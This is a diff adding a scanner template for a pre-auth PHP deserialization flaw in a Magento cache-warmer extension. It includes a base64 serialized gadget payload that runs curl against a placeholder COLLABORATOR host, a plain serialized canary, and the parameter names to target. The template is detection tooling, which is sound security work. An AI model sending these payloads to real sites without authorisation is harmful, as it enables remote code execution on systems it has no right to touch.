@@ -738,6 +738,34 @@
           }
         }
       ]
+    },
+    "magento_mirasvit_php_unserialize_rce_2026": {
+      "description": "CVE-2026-45247 (CISA KEV, actively exploited) — Mirasvit Cache Warmer extension for Magento accepts attacker-controlled serialized PHP objects via specific cache-related HTTP params. Reaches PHP unserialize() with no class allowlist; gadget chain (commonly Magento\\Framework\\Phrase or Symfony __destruct gadgets) → arbitrary PHP code execution. Pre-auth, CVSS 9.8.",
+      "tech_match": ["magento", "magento2", "mirasvit", "adobe-commerce", "php"],
+      "param_match": ["cache", "cache_data", "session", "data", "warmer", "queue"],
+      "probes": [
+        {
+          "payload": "TzoxOToiTWFnZW50b1xcRnJhbWV3b3JrXFxQaHJhc2UiOjI6e3M6OToiX19jbGFzcyI6czoxNDoiU3lzdGVtRXhlYyI7czo4OiJfX3RleHQiOnM6MzI6ImN1cmwgaHR0cDovL0NPTExBQk9SQVRPUiI7fQ==",
+          "description": "Base64-encoded canary PHP-serialized object — Magento Phrase + SystemExec-shaped gadget invoking curl to Collaborator. Vulnerable site processes unserialize() and the gadget triggers an outbound HTTP callback. Replace COLLABORATOR with operator's host at runtime.",
+          "matchers": [
+            {"type": "collaborator", "interaction_types": ["HTTP", "DNS"]}
+          ],
+          "severity": "critical",
+          "confidence_boost": 85,
+          "variables": {"manual_chain": true, "requires_collaborator": true, "content_type": "application/x-www-form-urlencoded", "actively_exploited": true}
+        },
+        {
+          "payload": "O:8:\"stdClass\":1:{s:6:\"canary\":s:13:\"SWK_MAGENTO_42\"}",
+          "description": "Plain PHP serialized canary — no gadget; just confirms the endpoint accepts and processes serialized data without rejecting unknown classes. Reflection of the canary string indicates the unsafe deserialization path is reachable.",
+          "matchers": [
+            {"type": "word", "words": ["SWK_MAGENTO_42", "stdClass", "unserialize"], "condition": "or"},
+            {"type": "status", "status": [200, 500]}
+          ],
+          "severity": "high",
+          "confidence_boost": 70,
+          "variables": {"manual_chain": true, "content_type": "application/x-www-form-urlencoded"}
+        }
+      ]
     }
   }
 }
